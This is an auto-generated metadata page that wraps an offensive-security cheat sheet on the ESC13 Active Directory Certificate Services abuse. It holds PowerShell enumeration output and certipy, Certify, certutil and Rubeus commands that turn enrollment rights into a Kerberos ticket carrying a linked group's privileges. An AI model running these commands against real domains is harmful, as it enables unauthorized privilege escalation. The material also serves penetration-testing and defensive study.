---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Active Directory - Certificate ESC13

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-active-directory-ad-adcs-esc13` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc13.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Active Directory - Certificate ESC13](../../topics/active-directory/active-directory-certificate-esc13.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-active-directory-ad-adcs-esc13 |
| name | Active Directory - Certificate ESC13 |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/active-directory/ad-adcs-esc13.md |

## Preserved Source Material

````yaml
_body: "# Active Directory - Certificate ESC13\n\n## ESC13 - Issuance Policy\n\n> If a principal (user or computer) has enrollment\
  \ rights on a certificate template configured with an issuance policy that has an OID group link, then this principal can\
  \ enroll a certificate that allows obtaining access to the environment as a member of the group specified in the OID group\
  \ link.\n\n**Requirements**\n\n* The principal has enrollment rights on a certificate template\n* The certificate template\
  \ has an issuance policy extension\n* The issuance policy has an OID group link to a group\n* The certificate template defines\
  \ EKUs that enable client authentication\n\n```ps1\nPS C:\\> $ESC13Template = Get-ADObject \"CN=ESC13Template,$TemplateContainer\"\
  \ -Properties nTSecurityDescriptor $ESC13Template.nTSecurityDescriptor.Access | ? {$_.IdentityReference -eq \"DUMPSTER\\\
  ESC13User\"}\nAccessControlType     : Allow\n\n# check if there is an issuance policy in the msPKI-Certificate-Policy\n\
  PS C:\\> Get-ADObject \"CN=ESC13Template,$TemplateContainer\" -Properties msPKI-Certificate-Policy\nmsPKI-Certificate-Policy\
  \ : {1.3.6.1.4.1.311.21.8.4571196.1884641.3293620.10686285.12068043.134.3651508.12319448}\n\n# check for OID group link\n\
  PS C:\\> Get-ADObject \"CN=12319448.2C2B96A74878E00434BEDD82A61861C5,$OIDContainer\" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink\n\
  msDS-OIDToGroupLink     : CN=ESC13Group,OU=Groups,OU=Tier0,DC=dumpster,DC=fire\n\n# verify if ESC13Group is a Universal\
  \ group\nPS C:\\> Get-ADGroup ESC13Group -Properties Members\nGroupScope        : Universal\nMembers           : {}\n```\n\
  \n**Exploitation**:\n\n* Find a vulnerable template\n\n  ```ps1\n  certipy find -target dc.lab.local -dc-ip 10.10.10.10\
  \ -u \"username\" -p \"P@ssw0rd\" -stdout -vulnerable\n  ```\n\n* Request a certificate for the vulnerable template\n\n\
  \  ```ps1\n  .\\Certify.exe request /ca:DC01\\dumpster-DC01-CA /template:ESC13Template\n  certipy req -target dc.lab.local\
  \ -dc-ip 10.10.10.10 -u \"username\" -p \"P@ssw0rd\" -template <ESC13-Template> -ca <CA-NAME>\n  ```\n\n* Merge into a PFX\
  \ file\n\n  ```ps1\n  certutil -MergePFX .\\esc13.pem .\\esc13.pfx\n  ```\n\n* Verify the presence of the \"Client Authentication\"\
  \ and the \"Policy Identifier\"\n\n  ```ps1\n  certutil -Dump -v .\\esc13.pfx\n  ```\n\n* Pass-The-Certificate: Ask a TGT\
  \ for our user, but we are also member of the linked group and inherited their privileges\n\n  ```ps1\n  Rubeus.exe asktgt\
  \ /user:ESC13User /certificate:C:\\esc13.pfx /nowrap\n  Rubeus.exe asktgt /user:username /certificate:username.pfx /domain:lab.local\
  \ /dc:dc /nowrap\n  ```\n\n* Pass-The-Ticket: Use the ticket that grant privileges from the AD group\n\n  ```ps1\n  Rubeus.exe\
  \ ptt /ticket:<ticket>\n  ```\n\n## References\n\n* [ADCS ESC13 Abuse Technique - Jonas Bülow Knudsen - 02/15/2024](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53)\n\
  * [Exploitation de l’AD CS : ESC12, ESC13 et ESC14 - Guillon Bony Rémi - February, 2025](https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14)\n\
  * [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)"
_relative_path: active-directory/ad-adcs-esc13.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/active-directory/ad-adcs-esc13.md
````
